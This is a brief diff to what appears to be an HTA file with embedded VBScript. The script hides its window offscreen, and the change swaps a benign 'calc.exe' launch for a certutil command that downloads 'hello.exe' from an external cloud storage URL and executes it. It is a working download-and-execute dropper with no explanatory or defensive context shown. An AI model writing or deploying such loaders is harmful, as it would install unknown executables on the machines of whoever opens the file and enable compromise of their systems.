@@ -5,7 +5,8 @@
 Window.ReSizeTo 0, 0
 Window.moveTo -2000,-2000
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "calc.exe"
+objShell.Run "certutil.exe -urlcache -split -f https://starrynight-32.oss-cn-shenzhen.aliyuncs.com/ToMyLove/hello.exe hello.exe"
+objShell.Run "hello.exe"
 self.close
 </script>
 <body>
